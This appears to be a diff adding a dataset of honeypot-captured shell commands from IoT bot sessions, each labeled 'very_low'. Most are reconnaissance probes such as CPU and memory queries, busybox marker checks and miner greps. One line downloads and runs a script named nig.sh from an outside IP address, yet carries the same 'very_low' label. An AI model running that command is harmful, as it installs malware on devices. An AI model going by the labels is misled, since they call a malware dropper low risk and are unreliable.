+{"command":"config terminal","label":"very_low"}
+{"command":"busybox DNXFCOW","label":"very_low"}
+{"command":"\/bin\/busybox DNXFCOW","label":"very_low"}
+{"command":"ifconfig","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo","label":"very_low"}
+{"command":"ps | grep '[Mm]iner'","label":"very_low"}
+{"command":"ps -ef | grep '[Mm]iner'","label":"very_low"}
+{"command":"ls -la \/dev\/ttyGSM* \/dev\/ttyUSB-mod* \/var\/spool\/sms\/* \/var\/log\/smsd.log \/etc\/smsd.conf* \/usr\/bin\/qmuxd \/var\/qmux_connect_socket \/etc\/config\/simman \/dev\/modem* \/var\/config\/sms\/*","label":"very_low"}
+{"command":"echo Hi | cat -n","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"echo -e '\\x41\\x4b\\x34\\x37'","label":"very_low"}
+{"command":"cat \/proc\/mounts;busybox cat \/proc\/mounts","label":"very_low"}
+{"command":"\/ip cloud print","label":"very_low"}
+{"command":"ifconfig","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo","label":"very_low"}
+{"command":"ps | grep '[Mm]iner'","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"\/bin\/busybox gay","label":"very_low"}
+{"command":"echo -en \"\\x6d\\x69\\x6e\\x65\\x72\\x77\\x6f\\x72\\x64\"","label":"very_low"}
+{"command":"ls \/home; ps aux; \/bin\/busybox gay; echo -en \"\\x6d\\x69\\x6e\\x65\\x72\\x77\\x6f\\x72\\x64\"","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"linuxshell","label":"very_low"}
+{"command":"\/bin\/busybox BITCOIN","label":"very_low"}
+{"command":"uname -a ; lscpu","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"ls \/","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"lscpu | grep Model","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo|grep name|cut -f2 -d':'|uniq -c ; uname -a","label":"very_low"}
+{"command":"cat \/bin\/sh","label":"very_low"}
+{"command":"start","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"config terminal","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"linuxshell","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"echo -e '\\x62\\x70\\x6E\\x68\\x7A'","label":"very_low"}
+{"command":"cat \/bin\/ls|more","label":"very_low"}
+{"command":"cat \/bin\/ls|head -n 1","label":"very_low"}
+{"command":"dd bs=52 count=1 if=\/bin\/ls || cat \/bin\/ls || while read i; do echo $i; done < \/bin\/ls || while read i; do echo $i; done < \/bin\/busybox","label":"very_low"}
+{"command":"chmod","label":"very_low"}
+{"command":"cat \/bin\/sh || cat \/bin\/busybox || cat \/bin\/bash","label":"very_low"}
+{"command":"echo -e '\\x79\\x65\\x73\\x68\\x65\\x6c\\x6f'","label":"very_low"}
+{"command":"cat \/bin\/echo","label":"very_low"}
+{"command":"cat \/proc\/mounts","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"linuxshell","label":"very_low"}
+{"command":"rm -rf nig.sh; rm -rf miori.*; wget http:\/\/2.56.59.225\/nig.sh || curl -O http:\/\/2.56.59.225\/nig.sh || tftp 2.56.59.225 -c get nig.sh || tftp -g -r nig.sh 2.56.59.225; chmod 777 nig.sh;.\/nig.sh ssh; rm -rf nig.sh","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"cat \/proc\/mounts; \/bin\/busybox CACBS","label":"very_low"}
+{"command":"tftp; wget; \/bin\/busybox CACBS","label":"very_low"}
+{"command":"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s","label":"very_low"}
+{"command":"\/bin\/busybox CACBS","label":"very_low"}
+{"command":"\/bin\/busybox JIGOKU","label":"very_low"}
+{"command":"wget --help >\/dev\/null && echo -e '\\x57\\x47\\x45\\x54\\x5f\\x46\\x4f\\x55\\x4e\\x44';curl --help >\/dev\/null && echo -e '\\x43\\x55\\x52\\x4c\\x5f\\x46\\x4f\\x55\\x4e\\x44';ftpget --help >\/dev\/null && echo -e '\\x46\\x54\\x50\\x5f\\x46\\x4f\\x55\\x4e\\x44'; echo -e '\\x45\\x43\\x48\\x4f\\x5f\\x46\\x4f\\x55\\x4e\\x44'","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"ls -lh $(which ls)","label":"very_low"}
+{"command":"which ls","label":"very_low"}
+{"command":"crontab -l","label":"very_low"}
+{"command":"w","label":"very_low"}
+{"command":"uname -m","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep model | grep name | wc -l","label":"very_low"}
+{"command":"top","label":"very_low"}
+{"command":"uname","label":"very_low"}
+{"command":"uname -a","label":"very_low"}
+{"command":"lscpu | grep Model","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | wc -l","label":"very_low"}
+{"command":"cat \/proc\/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","label":"very_low"}
+{"command":"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","label":"very_low"}
+{"command":"enable","label":"very_low"}
+{"command":"system","label":"very_low"}
+{"command":"shell","label":"very_low"}
+{"command":"cat \/proc\/mounts; \/bin\/busybox OCPSW","label":"very_low"}
+{"command":"tftp; wget; \/bin\/busybox OCPSW","label":"very_low"}
+{"command":"dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s","label":"very_low"}
+{"command":"\/bin\/busybox OCPSW","label":"very_low"}
+{"command":"echo A","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"cd ..","label":"very_low"}
+{"command":"ls","label":"very_low"}
+{"command":"ls","label":"very_low"}
